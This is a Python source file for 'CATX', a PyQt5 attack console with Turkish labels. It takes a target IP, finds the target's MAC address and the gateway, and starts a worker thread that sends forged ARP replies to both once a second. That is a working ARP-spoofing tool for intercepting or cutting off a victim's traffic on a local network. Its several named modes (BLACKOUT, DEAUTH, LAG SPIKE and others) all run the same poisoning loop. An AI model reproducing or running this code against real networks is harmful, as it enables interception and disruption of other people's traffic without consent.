#!/usr/bin/env python3
import sys,os,time,threading,subprocess,random,socket,time

from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QLabel, QTableWidget, QTableWidgetItem, 
                             QFrame, QTextEdit, QPushButton, QHeaderView, QAbstractItemView)
from PyQt5.QtCore import QTimer, Qt, QThread, pyqtSignal
from PyQt5.QtGui import QFont, QColor

print(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))

# INPUT IP
target_ip_input = input("Hedef IP gir: ")

# Scapy
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import ARP, Ether, srp, send, conf

conf.verb = 0

MOD_DETAILS = {
    "01": "BLACKOUT", "17": "PORT MAP", "33": "LAG SPIKE",
    "55": "DEAUTH", "60": "JUDGEMENT"
}

class AttackWorker(QThread):
    log_signal = pyqtSignal(str)

    def __init__(self, target_ip, target_mac, gw_ip, mode):
        super().__init__()
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.gw_ip = gw_ip
        self.mode = mode
        self._is_running = True

    def run(self):
        self.log_signal.emit(f"[OPERASYON] {self.target_ip} üzerine MOD-{self.mode} başlatıldı.")
        while self._is_running:
            try:
                pkt = Ether(dst=self.target_mac)/ARP(op=2, pdst=self.target_ip, psrc=self.gw_ip, hwdst=self.target_mac)
                pkt_gw = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=self.gw_ip, psrc=self.target_ip)

                send(pkt, verbose=False)
                send(pkt_gw, verbose=False)
                time.sleep(1)
            except:
                break

    def stop(self):
        self._is_running = False


class CATXGUI(QMainWindow):

    def __init__(self):
        super().__init__()

        self.setWindowTitle("CATX")
        self.setMinimumSize(1200,850)
        self.setStyleSheet("background-color:#050505;color:#ff0000;font-family:'Courier New';")

        self.active_attacks = {}

        try:
            self.gw_ip = subprocess.check_output(
                "ip route show | grep default",shell=True
            ).decode().split()[2]
        except:
            self.gw_ip = "ip kısmı"

        self.init_ui()

        # INPUT ile gelen IP tabloya ekleniyor
        self.add_target(target_ip_input)

    def init_ui(self):

        central = QWidget()
        self.setCentralWidget(central)

        layout = QVBoxLayout(central)

        header = QFrame()
        header.setStyleSheet("border:2px solid #ff0000;background:#1a0000;border-radius:10px;")

        h_lay = QVBoxLayout(header)

        title = QLabel("C A T X")
        title.setAlignment(Qt.AlignCenter)
        title.setFont(QFont("Courier New",24,QFont.Bold))

        h_lay.addWidget(title)
        layout.addWidget(header)

        body_layout = QHBoxLayout()

        self.table = QTableWidget(0,4)
        self.table.setHorizontalHeaderLabels(["ID","IP ADRESI","MARKA/VENDOR","DURUM"])
        self.table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.table.setStyleSheet("QTableWidget{background:#000;border:1px solid #440000;color:#fff;}")
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)

        body_layout.addWidget(self.table,3)

        ctrl_frame = QFrame()
        ctrl_frame.setStyleSheet("border:1px solid #ff0000;background:#0a0a0a;")

        ctrl_lay = QVBoxLayout(ctrl_frame)
        ctrl_lay.addWidget(QLabel("[ OPERASYON MERKEZİ ]"),alignment=Qt.AlignCenter)

        for mod_id,name in MOD_DETAILS.items():

            btn = QPushButton(f"MOD-{mod_id}: {name}")

            btn.setStyleSheet(
                "QPushButton{background:#220000;color:#ff0000;padding:10px;border:1px solid #ff0000;font-weight:bold;}\
                 QPushButton:hover{background:#ff0000;color:#000;}"
            )

            btn.clicked.connect(lambda checked,m=mod_id:self.start_action(m))
            ctrl_lay.addWidget(btn)

        stop_btn = QPushButton("STOP ALL")

        stop_btn.setStyleSheet(
            "background:#ff0000;color:#000;font-weight:bold;padding:15px;"
        )

        stop_btn.clicked.connect(self.stop_all)

        ctrl_lay.addStretch()
        ctrl_lay.addWidget(stop_btn)

        body_layout.addWidget(ctrl_frame,1)

        layout.addLayout(body_layout)

        self.log_win = QTextEdit()
        self.log_win.setReadOnly(True)
        self.log_win.setStyleSheet("background:#000;color:#00ff00;border:1px solid #220000;")

        layout.addWidget(self.log_win,1)

        self.graph = QLabel("▂▃▄▅▆▇█▇▆▅▄")
        self.graph.setAlignment(Qt.AlignCenter)
        self.graph.setStyleSheet("font-size:25pt;color:#ff0000;")

        layout.addWidget(self.graph)

        self.timer = QTimer()
        self.timer.timeout.connect(self.anim)
        self.timer.start(100)

    def add_target(self,ip):

        row = self.table.rowCount()
        self.table.insertRow(row)

        self.table.setItem(row,0,QTableWidgetItem(str(row)))
        self.table.setItem(row,1,QTableWidgetItem(ip))
        self.table.setItem(row,2,QTableWidgetItem("MANUEL"))
        self.table.setItem(row,3,QTableWidgetItem("AKTİF"))

        self.log_win.append(f"[INPUT] Hedef eklendi: {ip}")

    def anim(self):

        c = [" ","▂","▃","▄","▅","▆","▇","█"]
        self.graph.setText("".join([random.choice(c) for _ in range(50)]))

    def start_action(self,mode):

        selected = self.table.currentRow()

        if selected == -1:
            self.log_win.append("[!] HATA: Önce cihaz seçin.")
            return

        target_ip = self.table.item(selected,1).text()

        ans,_ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip),
            timeout=1,
            verbose=False
        )

        if ans:

            target_mac = ans[0][1].hwsrc

            worker = AttackWorker(
                target_ip,
                target_mac,
                self.gw_ip,
                mode
            )

            worker.log_signal.connect(lambda m:self.log_win.append(m))
            worker.start()

            self.active_attacks[target_ip] = worker

            self.table.item(selected,3).setText("!! SALDIRI !!")
            self.table.item(selected,3).setForeground(QColor(255,0,0))

    def stop_all(self):

        for ip,worker in self.active_attacks.items():
            worker.stop()

        self.active_attacks.clear()

        for i in range(self.table.rowCount()):

            self.table.item(i,3).setText("AKTİF")
            self.table.item(i,3).setForeground(QColor(0,255,0))

        self.log_win.append("[SİSTEM] Tüm operasyonlar durduruldu.")


if __name__ == "__main__":

    app = QApplication(sys.argv)

    if os.geteuid() != 0:
        print("SUDO GEREKLİ!")
        sys.exit()

    win = CATXGUI()
    win.show()

    sys.exit(app.exec_())
